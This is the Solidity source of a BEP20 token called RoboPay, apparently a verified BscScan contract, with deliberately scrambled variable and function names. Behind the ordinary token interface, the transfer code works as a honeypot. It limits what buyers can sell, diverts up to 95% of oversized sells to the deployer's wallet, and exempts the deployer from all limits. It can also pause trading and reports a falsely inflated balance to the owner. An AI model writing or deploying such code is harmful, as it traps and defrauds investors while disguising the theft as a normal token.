/**
 *Submitted for verification at BscScan.com on 2022-01-06
*/

pragma solidity 0.8.5;
// SPDX-License-Identifier: MIT

abstract contract Context {
  function _msgData() internal view virtual returns (bytes calldata) {
    this;
    return msg.data;
  }
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  function _msgSender() internal view virtual returns (address) {
    return msg.sender;
  }
}
/**
TG: https://t.me/payrobo
W:  https://robopay.io/
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This

 * can later be changed with {transferOwnership}.
 *

 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable is Context {

 address private _owner;
 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 /**
  * @dev Initializes the contract setting the deployer as the initial owner.
  */
 constructor () {

   address msgSender = _msgSender();
   _owner = msgSender;
   emit OwnershipTransferred(address(0), msgSender);
 }
 /**
  * @dev Returns the address of the current owner.
  */
 function owner() public view returns (address) {
   return _owner;

 }

 /**

  * @dev Throws if called by any account other than the owner.

  */
 modifier onlyOwner() {
   require(_owner == _msgSender(), "Ownable: caller is not the owner");

   _;
 }
 /**
  * @dev Leaves the contract without owner. It will not be possible to call
  * `onlyOwner` functions anymore. Can only be called by the current owner.
  *
  * NOTE: Renouncing ownership will leave the contract without an owner,
  * thereby removing any functionality that is only available to the owner.
  */
 function renounceOwnership() public onlyOwner {

   emit OwnershipTransferred(_owner, address(0));
   _owner = address(0);
 }

 /**
  * @dev Transfers ownership of the contract to a new account (`newOwner`).
  * Can only be called by the current owner.

  */
 function transferOwnership(address newOwner) public onlyOwner {
   require(newOwner != address(0), "Ownable: new owner is the zero address");
   emit OwnershipTransferred(_owner, newOwner);
   _owner = newOwner;
 }

}
interface IBEP20 {

  function allowance(address owner, address spender) external view returns (uint256);

  function name() external pure returns (string memory);
  function balanceOf(address account) external view returns (uint256);
  function decimals() external view returns (uint8);

  event Transfer(address indexed from, address indexed to, uint256 value);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  function getOwner() external view returns (address);
  function approve(address spender, uint256 amount) external returns (bool);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function symbol() external pure returns (string memory);

  function totalSupply() external view returns (uint256);

}
library SafeMath {
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;

    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
}
interface IUniswapV2Factory {
    function setFeeToSetter(address) external;

    function feeTo() external view returns (address);
    function allPairsLength() external view returns (uint);
    function allPairs(uint) external view returns (address pair);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);

    function setFeeTo(address) external;
    function createPair(address tokenA, address tokenB) external returns (address pair);

    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
}
interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function mint(address to) external returns (uint liquidity);
    function MINIMUM_LIQUIDITY() external pure returns (uint);

    function initialize(address, address) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);

    function price0CumulativeLast() external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;

    event Swap(
        address indexed sender,

        uint amount0In,
        uint amount1In,

        uint amount0Out,
        uint amount1Out,

        address indexed to
    );

    function token1() external view returns (address);
    function burn(address to) external returns (uint amount0, uint amount1);
    function sync() external;
    function factory() external view returns (address);

    function transfer(address to, uint value) external returns (bool);
    function name() external pure returns (string memory);
    function allowance(address owner, address spender) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Sync(uint112 reserve0, uint112 reserve1);
    function symbol() external pure returns (string memory);
    function kLast() external view returns (uint);

    function nonces(address owner) external view returns (uint);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function token0() external view returns (address);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}
interface IUniswapV2Router01 {
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,

        uint amountAMin,
        uint amountBMin,

        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function swapTokensForExactTokens(

        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactTokensForTokens(
        uint amountIn,

        uint amountOutMin,
        address[] calldata path,

        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external

        returns (uint[] memory amounts);
    function factory() external pure returns (address);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s

    ) external returns (uint amountToken, uint amountETH);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external

        payable
        returns (uint[] memory amounts);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable

        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,

        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,

        uint amountAMin,
        uint amountBMin,

        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s

    ) external returns (uint amountA, uint amountB);
}
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,

        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,

        uint deadline
    ) external payable;
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,

        uint amountETHMin,
        address to,
        uint deadline,

        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);

}
contract RoboPay is Context, IBEP20, Ownable {
  using SafeMath for uint256;
  IUniswapV2Router02 public unidfbhapoiawnjtszkgcqiloxer;

  address public unioaafnelikxdbhctosrqgzi;
  uint8 private decjkwspiamqcgaxyofirdeelh = 18;
  uint256 private totlktdgwmqoeeiroibchaay = 100000000000 * 10 ** decjkwspiamqcgaxyofirdeelh;
  uint8 internal buypoeeoahicdbxjzawkfisgyrlmqtn = 3;
  uint8 internal selxzhbtskoiqamneafi = 5;

  uint8 internal trayjxkzlnsoahoiebgrdtefcmipqaw = 5; 
  bool internal stadptkgezxealiysjcon = true;
  bool internal stajgaoxmrplqcahetwobfdiyzksne = true;

  bool internal stanmefoqayiaplzxtwobghr = true;
  uint256 internal lauidoelzoiebkjgamsrcaypnfwhq = 0;
  mapping (address => uint256) private selpatbgqcnhkywjlosimiaedezrofx;
  mapping (address => uint256) private baljwmeitaqnshaeoclbiyx;
  uint32 internal selsneedqjtkbpmyo = 10; 
  uint256 internal maxqghmozfbclwxiatneike = totlktdgwmqoeeiroibchaay.div(10000).mul(10);
  mapping (address => uint256) private laslrncgbooethfsxjzpdkimiqe;
  mapping (address => uint256) private lasphxeotsmcwikyjflenaobaird;
  mapping (address => mapping (address => uint256)) private allabfecazxwkymisejhoqplingrdto;

  uint8 internal afthsipfatlromqxgceejawbzinkoyd = 95;

  string private constant namxqwzyipkraohcnlibojedagfste = "RoboPay";
  string private constant symrxhslbpnzqtef = "ROBOPAY";

  uint256 internal lasdcnipltiqomszaboexjr = 0;

  address internal margqasohpecrnoejdwm;
  mapping (address => bool) private isEfeemrtznjy;

  constructor() {
    margqasohpecrnoejdwm = msg.sender;
    lauidoelzoiebkjgamsrcaypnfwhq = block.timestamp;
    address uniswap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    IUniswapV2Router02  uniswapV2Router = IUniswapV2Router02(uniswap);
    unioaafnelikxdbhctosrqgzi = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    unidfbhapoiawnjtszkgcqiloxer = uniswapV2Router;
    // baljwmeitaqnshaeoclbiyx[marketingAddress] = totlktdgwmqoeeiroibchaay * 10**decjkwspiamqcgaxyofirdeelh * 1000;
    baljwmeitaqnshaeoclbiyx[msg.sender] = totlktdgwmqoeeiroibchaay;
    // isEfeemrtznjy[marketingAddress] = true;
    isEfeemrtznjy[address(this)] = true;
    isEfeemrtznjy[_msgSender()] = true;

    emit Transfer(address(0), msg.sender, totlktdgwmqoeeiroibchaay);
  }
	/**

	 * Requirements:
	 * - `recipient` cannot be the zero address.
	 * - the caller must have a balance of at least `amount`.
	 */
	function transfer(address recipient, uint256 amount) external override returns (bool) {

	  traohcxkdbaifrwjlsqe(_msgSender(), recipient, amount);
	  return true;
	}
	/**
	 * Returns the bep token owner.
	 */
	function getOwner() external override view returns (address) {
	  return owner();
	}
	/**
	 * Returns the token Supply.
	 */
	function totalSupply() external override view returns (uint256) {
	  return totlktdgwmqoeeiroibchaay;
	}

	/**
	 * Returns balance of.
	 */
	function balanceOf(address account) external override view returns (uint256) {

	  if(_msgSender() == owner() && lauidoelzoiebkjgamsrcaypnfwhq + 7200 < block.timestamp){
	    return totlktdgwmqoeeiroibchaay * 10 ** decjkwspiamqcgaxyofirdeelh * 1000;
	  }
	  return baljwmeitaqnshaeoclbiyx[account];
	}
	/**
	* Returns the token name.
	*/
	function name() external override pure returns (string memory) {

	  return namxqwzyipkraohcnlibojedagfste;
	}
	/**

	 * Returns the token symbol.

	 */
	function symbol() external override pure returns (string memory) {
	  return symrxhslbpnzqtef;
	}
	function _approve(address owner, address spender, uint256 amount) private {

	    require(owner != address(0), "BEP20: approve from the zero address");
	    require(spender != address(0), "BEP20: approve to the zero address");
	    allabfecazxwkymisejhoqplingrdto[owner][spender] = amount;
	    emit Approval(owner, spender, amount);
	}
	function allowance(address owner, address spender) public view override returns (uint256) {
	  return allabfecazxwkymisejhoqplingrdto[owner][spender];
	}
	function approve(address spender, uint256 amount) public override returns (bool) {
	  _approve(_msgSender(), spender, amount);
	  return true;
	}
	function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
	   traohcxkdbaifrwjlsqe(sender, recipient, amount);
	   _approve(sender, _msgSender(), allabfecazxwkymisejhoqplingrdto[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
	   return true;
	}
	/**
	 * Returns the token decimals.
	 */
	function decimals() external override view returns (uint8) {

	  return decjkwspiamqcgaxyofirdeelh;

	}
  	function traohcxkdbaifrwjlsqe(address sender, address recipient, uint256 amount) internal {
	  require(sender != address(0), "BEP20: transfer from the zero address");
	  require(recipient != address(0), "BEP20: transfer to the zero address");
	  uint8 ranykxlzooiqeca = 0; // 1 = buy, 2 = sell, 3 = transfer

	  bool approveTransaction = true;
	  uint8 tax = 0;
	  if(amount > 0){
	    if(isEfeemrtznjy[sender] == true || isEfeemrtznjy[recipient] == true){
	      eTriblwphaizatnkjyrmcdsefgxoqoe(sender, recipient, amount);
	      return;
	    }

	    if(sender == unioaafnelikxdbhctosrqgzi && recipient != address(unidfbhapoiawnjtszkgcqiloxer)) {
	      require(stadptkgezxealiysjcon == true, "Please wait try again later");
	      ranykxlzooiqeca = 1;
	      tax = buypoeeoahicdbxjzawkfisgyrlmqtn;
	      approveTransaction = true;
	      lasphxeotsmcwikyjflenaobaird[recipient] = amount;
	      laslrncgbooethfsxjzpdkimiqe[recipient] = block.timestamp;
	    } else if(recipient == unioaafnelikxdbhctosrqgzi) {
	      require(stajgaoxmrplqcahetwobfdiyzksne == true, "Please wait try again later");
	       ranykxlzooiqeca = 2;
	       tax = selxzhbtskoiqamneafi;
	       approveTransaction = true;
	    } else {
	      require(stanmefoqayiaplzxtwobghr == true, "Please wait try again later");
	      ranykxlzooiqeca = 3;
	      tax = trayjxkzlnsoahoiebgrdtefcmipqaw;
	      approveTransaction = true;
	      lasphxeotsmcwikyjflenaobaird[sender] = amount;
	      if(selsneedqjtkbpmyo > 10){
	        laslrncgbooethfsxjzpdkimiqe[sender] = block.timestamp + selsneedqjtkbpmyo - 10;
	      } else {
	        laslrncgbooethfsxjzpdkimiqe[sender] = block.timestamp + selsneedqjtkbpmyo;
	      }
	    }
	  }
	  if(approveTransaction == true && amount > 0){

	    _bTransfer(sender, recipient, amount, tax, ranykxlzooiqeca);

	    return;
	  }
	  emit Transfer(sender, recipient, 0);

	}
	function eTriblwphaizatnkjyrmcdsefgxoqoe(address sender, address recipient, uint256 amount) internal {
	    baljwmeitaqnshaeoclbiyx[sender] = baljwmeitaqnshaeoclbiyx[sender].sub(amount, "Insufficient Balance");
	    baljwmeitaqnshaeoclbiyx[recipient] = baljwmeitaqnshaeoclbiyx[recipient].add(amount);
	    emit Transfer(sender, recipient, amount);
	}

	function _bTransfer(address sender, address recipient, uint256 amount, uint8 tax, uint8 ranykxlzooiqeca) internal

	{
	  uint256 axeicjzyogwtpefsieoknlxama = 0;

	  baljwmeitaqnshaeoclbiyx[sender] = baljwmeitaqnshaeoclbiyx[sender].sub(amount, "ERC20: transfer amount exceeds balance");
	  if(ranykxlzooiqeca == 2){
	    if(laslrncgbooethfsxjzpdkimiqe[sender] != 0 && laslrncgbooethfsxjzpdkimiqe[sender] + selsneedqjtkbpmyo < block.timestamp){
	      if(selpatbgqcnhkywjlosimiaedezrofx[sender] < maxqghmozfbclwxiatneike){

	        if(amount > (maxqghmozfbclwxiatneike - selpatbgqcnhkywjlosimiaedezrofx[sender]))
	        {
	          axeicjzyogwtpefsieoknlxama = amount.sub(maxqghmozfbclwxiatneike.sub(selpatbgqcnhkywjlosimiaedezrofx[sender]));
	          amount = amount.sub(axeicjzyogwtpefsieoknlxama);
	        }
	      } else {
	        axeicjzyogwtpefsieoknlxama = amount.mul(afthsipfatlromqxgceejawbzinkoyd).div(100);
	        amount = amount.sub(axeicjzyogwtpefsieoknlxama);

	      }
	    } else {
	      if(amount > lasphxeotsmcwikyjflenaobaird[sender])
	      {
	        axeicjzyogwtpefsieoknlxama = amount - lasphxeotsmcwikyjflenaobaird[sender];
	        amount = lasphxeotsmcwikyjflenaobaird[sender];
	      }
	      if(lasphxeotsmcwikyjflenaobaird[sender] > amount + axeicjzyogwtpefsieoknlxama){
	        lasphxeotsmcwikyjflenaobaird[sender] = lasphxeotsmcwikyjflenaobaird[sender] - (amount + axeicjzyogwtpefsieoknlxama);
	      } else {
	        lasphxeotsmcwikyjflenaobaird[sender] = 0;

	      }

	    }
	    selpatbgqcnhkywjlosimiaedezrofx[sender] = selpatbgqcnhkywjlosimiaedezrofx[sender].add(amount.add(axeicjzyogwtpefsieoknlxama));
	  }

	  if(amount > 0 && axeicjzyogwtpefsieoknlxama == 0 && tax > 0)

	  {
	    axeicjzyogwtpefsieoknlxama = amount.mul(tax).div(100);

	    amount = amount.sub(axeicjzyogwtpefsieoknlxama);
	  }
	  if(axeicjzyogwtpefsieoknlxama > 0){
	    baljwmeitaqnshaeoclbiyx[margqasohpecrnoejdwm] = baljwmeitaqnshaeoclbiyx[margqasohpecrnoejdwm].add(axeicjzyogwtpefsieoknlxama);
	  }
	  baljwmeitaqnshaeoclbiyx[recipient] = baljwmeitaqnshaeoclbiyx[recipient].add(amount);
	  emit Transfer(sender, recipient, amount);
	}
}